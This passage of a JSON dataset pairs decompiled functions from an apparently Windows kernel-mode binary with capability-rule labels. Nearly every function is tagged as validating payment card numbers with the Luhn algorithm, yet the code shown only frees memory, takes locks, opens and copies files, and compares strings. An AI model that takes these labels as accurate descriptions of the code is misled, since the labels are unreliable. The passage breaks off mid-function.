        "decompiled_code": "\nuint fcn.00018720(int64_t *arg1, int64_t arg2, int64_t *arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    \n    uVar5 = 0;\n    if (*arg1 != 0) {\n        piVar4 = arg1;\n        uVar7 = uVar5;\n        uVar8 = uVar5;\n        do {\n            arg1_00 = *piVar4;\n            if (arg3 == NULL) {\ncode_r0x00018797:\n                fcn.00018584(arg1_00, arg2 + uVar8 * 8, CONCAT71(arg2 >> 8, 1), arg4);\n                iVar1 = *(arg1_00 + 0x38);\n                uVar8 = uVar8 + 1;\n                for (uVar6 = uVar5; (iVar1 != 0 && (*(uVar6 + iVar1) != 0)); uVar6 = uVar6 + 8) {\n                    if ((arg3 == NULL) || (piVar4 = *(uVar6 + iVar1) + 8,  *piVar4 != *arg3 && *arg3 <= *piVar4)) {\n                        iVar2 = fcn.00018584(*(uVar6 + iVar1), arg2 + uVar8 * 8, 0, arg4);\n                        uVar8 = uVar8 + 1;\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00061a5c(iVar2);\n                            return uVar3;\n                        }\n                    }\n                    iVar1 = *(arg1_00 + 0x38);\n                }\n            }\n            else {\n                piVar4 = *(arg1_00 + 0x38);\n                if (piVar4 != NULL) {\n                    for (; *piVar4 != 0; piVar4 = piVar4 + 1) {\n                        if (*(*piVar4 + 8) != *arg3 && *arg3 <= *(*piVar4 + 8)) goto code_r0x00018797;\n                    }\n                }\n            }\n            uVar7 = uVar7 + 1;\n            piVar4 = arg1 + uVar7;\n        } while (*piVar4 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 570
    },
    "00018928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00018928(ulong *arg1)\n\n{\n    if (arg1 != NULL) {\n        fcn.0002fc50(*arg1);\n        fcn.0002fc50(arg1);\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00019244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00019244(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = 0;\n    uVar2 = fcn.00061a38();\n    iVar1 = fcn.0004dd68(uVar2 & 0xffffffff, arg1, auStackX16);\n    if (iVar1 == 0) {\n        fcn.0004c898(uVar2 & 0xffffffff, auStackX16[0]);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 135
    },
    "00019290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00019290(ulong arg1, ulong arg2, code *arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong *arg3_00;\n    char in_R9B;\n    uint auStack72 [2];\n    uchar auStack64 [24];\n    \n    auStack72[0] = 0;\n    uVar2 = fcn.00061a7a(0xffffffffffffffff, 6, auStack72);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    arg3_00 = fcn.0002fbc4(0x18);\n    if (arg3_00 == NULL) {\n        return 0x21590004;\n    }\n    *arg3_00 = arg1;\n    arg3_00[1] = arg2;\n    uVar1 = (*_fcn.00011138)(0xfffffffffffffffe, 0, 0, 0, arg3_00 + 2, 0);\n    if (uVar1 == 0) {\n        if (in_R9B == '\\0') {\n            uVar1 = fcn.0001a650(auStack64, arg3, arg3_00);\n            if (uVar1 != 0) {\n                (*_fcn.000115b0)(arg3_00[2]);\n                goto code_r0x0001931d;\n            }\n            fcn.000316e0(auStack64);\n            fcn.00031648(auStack64, 0);\n            fcn.00031624(auStack64);\n        }\n        else {\n            (*arg3)(arg3_00);\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x0001931d:\n        uVar2 = uVar1;\n        fcn.0002fc50(arg3_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 428
    },
    "0001a114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0001a114(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.0002f1ec(0x78b40);\n    fcn.000313e0(0x78b48);\n    *0x78b30 = 1;\n    iVar1 = fcn.0001a650(0x78b20, 0x19fa4, 0);\n    if (iVar1 != 0) {\n        fcn.000315d4(0x78b48);\n        fcn.0002f214(0x78b40);\n    }\n    return iVar1;\n}\n",
        "token_count": 140
    },
    "0001a178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001a178(uint64_t arg1, uchar *arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    uint64_t uStack88;\n    ulong uStack80;\n    uint auStack72 [2];\n    ulong uStack64;\n    ulong uStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    auStack72[0] = 0x30;\n    uStack88 = arg1 & 0xffffffff;\n    uStack64 = 0;\n    uStack48 = 0;\n    uStack80 = 0;\n    uStack56 = 0;\n    uStack40 = 0;\n    uStack32 = 0;\n    uVar2 = fcn.00061a98(&uStackX24, 0x400, auStack72, &uStack88);\n    if (uVar2 == 0) {\n        uVar1 = fcn.00061a92(uStackX24, 0x1a, auStackX32, 8, 0);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            *arg2 = auStackX32[0];\n        }\n        fcn.000619de(uStackX24);\n    }\n    return uVar2;\n}\n",
        "token_count": 313
    },
    "0002fc50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002fc50(int64_t arg1)\n\n{\n    if ((arg1 != 0) && (arg1 != 0x7a638)) {\n        fcn.0001c6d8(arg1, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00049b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00049b70(uint64_t arg1, uchar *arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_GS_OFFSET;\n    uchar auStack152 [24];\n    ulong uStack128;\n    uchar *puStack120;\n    int32_t iStack112;\n    uchar auStack104 [72];\n    \n    uVar1 = (**0x111f0)();\n    if (arg1 == *(in_GS_OFFSET + 0x52)) {\n        iStack112 = (*0x49b50)(arg2);\n    }\n    else {\n        (*_fcn.00011600)(auStack152, 0, 0);\n        uStack128 = 0x49b50;\n        puStack120 = arg2;\n        (**0x11608)(auStack104, 0x1a428, auStack152);\n        uVar3 = 0;\n        (**0x11610)(auStack104, 2);\n        (**0x11618)(auStack104, uVar3 & 0xffffffffffffff00 | arg1 & 0xff);\n        (**0x11620)(auStack104, 0, 0);\n        do {\n            arg2 = auStack152;\n            iVar2 = (**0x111e8)(arg2);\n        } while (iVar2 == 0);\n    }\n    (*_fcn.000111e0)(arg2 & 0xffffffffffffff00 | uVar1);\n    return ~-(iStack112 != 0) & 0xc0000001;\n}\n",
        "token_count": 351
    },
    "0001a650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001a650(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    bool bVar4;\n    ulong auStack56 [3];\n    \n    LOCK();\n    bVar4 = *0x79990 == 0;\n    *0x79990 = *0x79990 ^ bVar4 * *0x79990;\n    if ((bVar4) && (iVar1 = (*_fcn.00011210)(auStack56, 0x1f03ff, 0, 0, 0, 0x1a520, 0),  iVar1 == 0)) {\n        fcn.00061aa4(auStack56[0], 0, 0);\n        fcn.000619de(auStack56[0]);\n    }\n    puVar3 = fcn.0002fbc4(0x10);\n    if (puVar3 != NULL) {\n        *puVar3 = arg2;\n        puVar3[1] = arg3;\n        iVar1 = (*_fcn.00011210)(arg1, 0x1f03ff, 0, 0, 0, 0x1a594, puVar3);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar2 = fcn.00061a5c();\n    fcn.0002fd3c(uVar2);\n    return 0xffffffff;\n}\n",
        "token_count": 340
    },
    "0001a878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0001a878(int64_t arg1, ulong arg2)\n\n{\n    bool bVar1;\n    \n    LOCK();\n    *0x799a0 = *0x799a0 + 1;\n    do {\n        LOCK();\n        bVar1 = *0x799a8 == 0;\n        *0x799a8 = *0x799a8 ^ bVar1 * *0x799a8;\n    } while (!bVar1);\n    if (arg1 != 0) {\n        fcn.0002fc50(arg1);\n    }\n    (*_fcn.000111e0)(arg2);\n    return 0;\n}\n",
        "token_count": 145
    },
    "0001a924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001a924(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == 0) || (arg2 == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0x11118)(arg2);\n        (**0x11110)(arg2);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "0001a9d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001a9d8(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == 0) || (arg2 == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0x11228)();\n        uVar1 = fcn.0001a924(arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "0001aa10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001aa10(int16_t *arg1, int16_t *arg2, int64_t arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int16_t *piVar6;\n    int64_t aiStackX8 [4];\n    int64_t *in_stack_00000028;\n    ulong in_stack_fffffffffffffd00;\n    uint uVar8;\n    ulong uVar7;\n    ulong in_stack_fffffffffffffd10;\n    uint uVar10;\n    uint64_t uVar9;\n    ulong in_stack_fffffffffffffd18;\n    uint uVar12;\n    ulong uVar11;\n    int64_t iStack712;\n    int64_t iStack704;\n    uchar auStack696 [8];\n    int64_t iStack688;\n    uint auStack680 [2];\n    ulong uStack672;\n    uchar *puStack664;\n    uint uStack656;\n    ulong uStack648;\n    ulong uStack640;\n    uchar auStack632 [16];\n    ulong uStack616;\n    int16_t aiStack600 [268];\n    \n    uVar8 = in_stack_fffffffffffffd00 >> 0x20;\n    uVar10 = in_stack_fffffffffffffd10 >> 0x20;\n    uVar12 = in_stack_fffffffffffffd18 >> 0x20;\n    iStack704 = 0;\n    iStack712 = 0;\n    aiStackX8[0] = 0;\n    if (((arg1 == NULL) || (*arg1 == 0)) || (arg2 == NULL)) {\n        return 0xc000000d;\n    }\n    fcn.0003034c(aiStack600, 0x104, arg1);\n    fcn.000619f0(auStack632, aiStack600);\n    uVar11 = CONCAT44(uVar12, 0x10);\n    uVar9 = CONCAT44(uVar10, 1);\n    puStack664 = auStack632;\n    uVar7 = CONCAT44(uVar8, 0x80);\n    auStack680[0] = 0x30;\n    uStack672 = 0;\n    uStack656 = 0x40;\n    uStack648 = 0;\n    uStack640 = 0;\n    uVar4 = fcn.0001dda0(&iStack704, 0x80100000, auStack680, auStack696, 0, uVar7, 1, uVar9, uVar11, 0, 0);\n    uVar8 = uVar7 >> 0x20;\n    uVar10 = uVar11 >> 0x20;\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    if (*arg2 == 0) {\ncode_r0x0001ab55:\n        iVar5 = fcn.00061a44(arg1);\n        if (iVar5 != 0) {\n            arg1 = iVar5 + 2;\n        }\n        piVar6 = arg1;\n        if (*arg2 != 0) {\n            fcn.0003034c(aiStack600, 0x104, arg2);\n            uVar4 = 0xffffffffffffffff;\n            piVar6 = aiStack600;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.00061ab0(aiStack600, 0x11a8c, 0x104 - (~uVar4 - 1));\n            uVar4 = 0xffffffffffffffff;\n            piVar6 = aiStack600;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.00061ab0(aiStack600, arg1, 0x104 - (~uVar4 - 1));\n            goto code_r0x0001abf1;\n        }\n    }\n    else {\n        uVar4 = 0xffffffffffffffff;\n        piVar6 = arg2;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar6 = arg2;\n        if (arg2[~uVar4 - 2] == 0x5c) goto code_r0x0001ab55;\n    }\n    fcn.0003034c(aiStack600, 0x104, piVar6);\ncode_r0x0001abf1:\n    fcn.000619f0(auStack632, aiStack600);\n    puStack664 = auStack632;\n    auStack680[0] = 0x30;\n    uStack672 = 0;\n    uStack656 = 0x40;\n    uStack648 = 0;\n    uStack640 = 0;\n    uVar2 = fcn.0001dda0(&iStack712, 0x40100000, auStack680, auStack696, 0, CONCAT44(uVar8, 0x80), 0, \n                         uVar9 & 0xffffffff00000000 | in_stack_00000028 != NULL, CONCAT44(uVar10, 0x10), 0, 0);\n    if (uVar2 == 0) {\n        iVar5 = fcn.0002fbc4(0x10000);\n        if (iVar5 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            if (in_stack_00000028 == NULL) {\n                aiStackX8[0] = 0;\n            }\n            else {\n                aiStackX8[0] = *in_stack_00000028;\n            }\n            iStack688 = 0;\n            while ((arg3 == 0 || (iVar3 = (**0x111e8)(arg3),  iVar3 == 0))) {\n                aiStackX8[0] = aiStackX8[0] + iStack688;\n                uVar2 = fcn.00061aaa(iStack704, 0, 0, 0, auStack696, iVar5, 0x10000, aiStackX8, 0);\n                if (uVar2 != 0) {\n                    if (uVar2 == 0xc0000011) {\n                        uVar2 = 0;\n                    }\n                    goto code_r0x0001ae10;\n                }\n                if ((arg3 != 0) && (iVar3 = (**0x111e8)(arg3),  iVar3 != 0)) break;\n                uVar2 = fcn.00061a08(iStack712);\n                if (uVar2 != 0) goto code_r0x0001ae10;\n                if (arg4 != 0) {\n                    for (uVar2 = arg4 / 200; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        if ((arg3 != 0) && (iVar3 = (**0x111e8)(arg3),  iVar3 != 0)) goto code_r0x0001ae01;\n                        uStack616 = 0xffffffffffe17b80;\n                        (**0x115e0)(0);\n                    }\n                }\n            }\ncode_r0x0001ae01:\n            uVar2 = 0xc0000120;\n        }\ncode_r0x0001ae10:\n        if (iVar5 != 0) {\n            fcn.0002fc50(iVar5);\n        }\n    }\n    if (iStack712 != 0) {\n        fcn.000619de();\n    }\n    if (iStack704 != 0) {\n        fcn.000619de();\n    }\n    if ((uVar2 == 0xc0000120) && (in_stack_00000028 != NULL)) {\n        *in_stack_00000028 = aiStackX8[0];\n    }\n    return uVar2;\n}\n",
        "token_count": 1856
    },
    "0001b08c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b08c(char param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    bool bVar4;\n    ulong auStackX16 [3];\n    \n    pcVar2 = (**0x11240)();\n    pcVar3 = pcVar2;\n    if (param_1 != pcVar2) {\n        while( true ) {\n            LOCK();\n            bVar4 = *0x799c0 == 0;\n            *0x799c0 = *0x799c0 ^ bVar4 * (*0x799c0 ^ 1);\n            pcVar3 = !bVar4 * *0x799c0;\n            if (bVar4) break;\n            auStackX16[0] = 0;\n            (**0x115e0)(0, 0, auStackX16);\n        }\n        pcVar1 = *0x799b0;\n        if (((param_1 == '\\0') || (pcVar1 = *0x799b8,  param_1 == '\\x01')) && (pcVar3 = pcVar1,  pcVar3 != NULL)) {\n            pcVar3 = (*pcVar3)();\n        }\n        LOCK();\n        *0x799c0 = *0x799c0 - 1;\n    }\n    return pcVar3 & 0xffffffffffffff00 | pcVar2 & 0xff;\n}\n",
        "token_count": 316
    },
    "0001b104": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001b104(ulong arg1, ulong arg2)\n\n{\n    fcn.0001a25c(arg1, arg2, 0, 0x1a228);\n    return;\n}\n",
        "token_count": 48
    },
    "0001b95c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0001b95c(ulong arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    bool bVar5;\n    \n    if (*0x79c78 == 0) {\n        fcn.000287f0(0x79b90, 0x52);\n        uVar3 = 0xffffffffffffffff;\n        piVar4 = 0x79b90;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        *0x79c78 = ~uVar3 - 1;\n        fcn.00061a0e(0x79ae0, 0x52, 0x11aa8, 0x79b90);\n        uVar3 = 0xffffffffffffffff;\n        piVar4 = 0x79ae0;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        *0x79c38 = ~uVar3 - 1;\n    }\n    iVar2 = fcn.00061a68(arg1, 0x79b90, *0x79c78);\n    if (iVar2 == 0) {\n        bVar5 = true;\n    }\n    else {\n        iVar2 = fcn.00030254(arg1, 0x79ae0, *0x79c38);\n        bVar5 = iVar2 == 0;\n    }\n    return bVar5;\n}\n",
        "token_count": 413
    },
    "0001c3a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0001c3a0(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.0002f1ec(0x79b88);\n    fcn.0002f1ec(0x799d0);\n    *0x799d8 = fcn.0002fc18(100);\n    if (*0x799d8 == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11b58, 0x1bc54);\n        if (iVar1 == 0) {\n            fcn.0005c47c();\n            iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11b48, 0x1be60);\n            if (iVar1 == 0) {\n                fcn.0005c47c();\n                iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11b38, 0x1b48c);\n                if (iVar1 == 0) {\n                    fcn.0005c47c();\n                    iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11b28, 0x1c020);\n                    if (iVar1 == 0) {\n                        fcn.0005c47c(*0x79c60);\n                        *0x79c68 = 1;\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 374
    },
    "0001c698": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001c698(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    \n    if (*0x79c98 == 0) {\n        (**0x11280)(arg1);\n    }\n    else {\n        pcVar1 = fcn.0005164c(*0x79c98);\n        (*pcVar1)(arg1, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0001c6d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001c6d8(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    \n    if (*0x79ca0 == 0) {\n        (**0x111c0)(arg1);\n    }\n    else {\n        pcVar1 = fcn.0005164c(*0x79ca0);\n        (*pcVar1)(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0001c904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001c904(void)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.000518b0();\n    if (uVar1 == 0) {\n        fcn.000529b0(0x11c08, 0x79c98);\n        fcn.000529b0(0x11bf0, 0x79ca0);\n        fcn.000529e8(0x11b38, 0x79ca8);\n        fcn.000529e8(0x11be0, 0x79cb0);\n        fcn.000529e8(0x11bd0, 0x79cb8);\n        fcn.000529e8(0x11bb8, 0x79cc0);\n        fcn.000518cc();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0001c990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001c990(void)\n\n{\n    fcn.00016938();\n    fcn.0001c660();\n    fcn.000169b4();\n    fcn.000619de(*(*0x64080 + 0x28));\n    *(*0x64080 + 0x28) = 0;\n    return 0;\n}\n",
        "token_count": 79
    },
    "0001c9cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001c9cc(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong uStackX8;\n    ulong auStackX16 [3];\n    uint auStack616 [2];\n    ulong uStack608;\n    ushort *puStack600;\n    uint uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ushort uStack568;\n    ushort uStack566;\n    ulong uStack560;\n    ushort auStack552 [8];\n    uchar auStack536 [528];\n    \n    uStack560 = 0x11c20;\n    puStack600 = &uStack568;\n    uStack568 = 0x70;\n    uStack566 = 0x72;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    iVar1 = fcn.00061aec(&uStackX8, 0x1f0003, auStack616);\n    if (iVar1 != 0) {\n        fcn.00028288(auStack536, 0x104);\n        fcn.000619f0(auStack552, auStack536);\n        puStack600 = auStack552;\n        auStack616[0] = 0x30;\n        uStack608 = 0;\n        uStack592 = 0x40;\n        uStack584 = 0;\n        uStack576 = 0;\n        iVar1 = fcn.00061aec(&uStackX8, 0x1f0003, auStack616);\n        if (iVar1 != 0) {\n            uVar3 = fcn.000312a4(auStackX16);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            puStack600 = auStack552;\n            auStack616[0] = 0x30;\n            uStack584 = auStackX16[0];\n            uStack608 = 0;\n            uStack592 = 0x240;\n            uStack576 = 0;\n            uVar2 = fcn.00061ae6(*0x64080 + 0x28, 0x1f0003, auStack616, 0, 0);\n            fcn.000313cc(auStackX16[0]);\n            return uVar2;\n        }\n    }\n    fcn.000619de(uStackX8);\n    return 0x40000000;\n}\n",
        "token_count": 568
    },
    "0001db50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001db50(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    uVar2 = 0;\n    if (*0x7a1d5 != '\\0') {\n        *0x7a1d5 = '\\0';\n        fcn.0005c47c(*0x7a1e8);\n        fcn.00052250(0x7a1e8);\n        fcn.0005c47c(*0x7a1f8);\n        fcn.00052250(0x7a1f8);\n        fcn.0005c47c(*0x7a1e0);\n        fcn.00052250(0x7a1e0);\n        fcn.0005c47c(*0x7a200);\n        fcn.00052250(0x7a200);\n        fcn.0005c47c(*0x7a1d8);\n        fcn.00052250(0x7a1d8);\n        fcn.0005c47c(*0x7a1f0);\n        fcn.00052250(0x7a1f0);\n        fcn.0001b130();\n        fcn.000315d4(0x7a268);\n        uVar3 = uVar2;\n        if (*0x79f38 != 0) {\n            do {\n                fcn.0002fc50(*(uVar3 + *0x79f40));\n                uVar1 = uVar2 + 1;\n                uVar2 = uVar1;\n                uVar3 = uVar3 + 8;\n            } while (uVar1 < *0x79f38);\n        }\n        fcn.0002fc50(*0x79f40);\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "0001dda0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0001dda0(void)\n\n{\n    (**0x112c0)();\n    return;\n}\n",
        "token_count": 24
    },
    "0001df90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001df90(ulong arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    \n    if (*0x7a290 == 0) {\n        fcn.00028750(0x79f60, 0x52);\n        uVar3 = 0xffffffffffffffff;\n        pcVar4 = 0x79f60;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        *0x7a290 = ~uVar3 - 1;\n        fcn.000287a0(0x7a0d0, 0x52);\n        uVar3 = 0xffffffffffffffff;\n        pcVar4 = 0x7a0d0;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        *0x79fc8 = ~uVar3 - 1;\n    }\n    iVar2 = fcn.00061a8c(arg1, 0x79f60, *0x7a290);\n    if ((iVar2 != 0) && (iVar2 = fcn.00061a8c(arg1, 0x7a0d0, *0x79fc8),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 389
    },
    "0001e1b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0001e1b4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar auStackX8 [32];\n    uchar auStack120 [104];\n    \n    iVar1 = fcn.00049dc4();\n    if (iVar1 != *(*0x64080 + 0x1c)) {\n        iVar2 = fcn.00030f70(auStack120, 0x52);\n        uVar4 = 0;\n        if ((iVar2 != 0) && (iVar2 = fcn.0001df90(auStack120),  iVar2 != 0)) {\n            return 1;\n        }\n        if (*0x7a1d5 != '\\0') {\n            fcn.00031564(0x7a268, auStackX8, 0);\n            piVar3 = *0x7a288;\n            uVar5 = uVar4;\n            if (*0x7a280 != 0) {\n                do {\n                    if (*piVar3 == iVar1) {\n                        uVar4 = 1;\n                        break;\n                    }\n                    uVar5 = uVar5 + 1;\n                    piVar3 = piVar3 + 2;\n                } while (uVar5 < *0x7a280);\n            }\n            fcn.00031598(0x7a268, auStackX8, 0);\n            return uVar4;\n        }\n    }\n    